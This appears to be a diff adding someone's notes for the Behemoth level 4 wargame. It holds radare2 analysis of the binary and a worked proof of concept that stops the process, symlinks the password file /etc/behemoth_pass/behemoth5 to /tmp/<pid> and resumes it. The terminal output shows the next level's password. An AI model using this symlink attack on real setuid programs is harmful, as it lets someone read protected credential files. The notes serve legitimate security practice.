@@ -1,0 +1,55 @@
+/tmp/tmp.gpXvcyCvuC
+
+$ r2 behemoth4
+> aaa (analyze)
+> afl (analyze list functions)
+0x08049030    1      6 sym.imp.__libc_start_main
+0x08049040    1      6 sym.imp.fclose
+0x08049050    1      6 sym.imp.sleep
+0x08049060    1      6 sym.imp.__stack_chk_fail
+0x08049070    1      6 sym.imp.getpid
+0x08049080    1      6 sym.imp.puts
+0x08049090    1      6 sym.imp.fopen
+0x080490a0    1      6 sym.imp.putchar
+0x080490b0    1      6 sym.imp.fgetc
+0x080490c0    1      6 sym.imp.sprintf
+0x080490d0    1     40 entry0
+0x080490f9    1      4 fcn.080490f9
+0x08049130    4     40 sym.deregister_tm_clones
+0x08049170    4     53 sym.register_tm_clones
+0x080491b0    3     34 entry.fini0
+0x080491e0    1      6 entry.init0
+0x08049120    1      4 sym.__x86.get_pc_thunk.bx
+0x080492c0    1     20 sym._fini
+0x08049110    1      1 sym._dl_relocate_static_pie
+0x080491e6    9    218 main
+0x08049000    3     32 sym._init
+> pdf @ main (print disassemble function, needs to be analyzed with af or so)
+or
+> s main (seek to main)
+> pdf
+
+Tries to open /tmp/<pid>
+If it fails then it exits
+Otherwise it starts to copy the content of the file to stdout
+
+PoC:
+behemoth4 $ pid=$! && kill -STOP $pid
+ln -s /etc/behemoth_pass/behemoth5 /tmp/$pid
+kill -CONT $pid
+
+behemoth4@behemoth:/tmp/tmp.gpXvcyCvuC$ /behemoth/behemoth4 & pid=$! && kill -STOP $pid
+[2] 2162145
+behemoth4@behemoth:/tmp/tmp.gpXvcyCvuC$ ln -s /etc/behemoth_pass/behemoth5 /tmp/$pid
+
+[2]+  Stopped                 /behemoth/behemoth4
+behemoth4@behemoth:/tmp/tmp.gpXvcyCvuC$ kill -CONT $pid
+behemoth4@behemoth:/tmp/tmp.gpXvcyCvuC$ Finished sleeping, fgetcing
+mVfC4rBKZ4
+
+[2]-  Done                    /behemoth/behemoth4
+
+
+
+
+
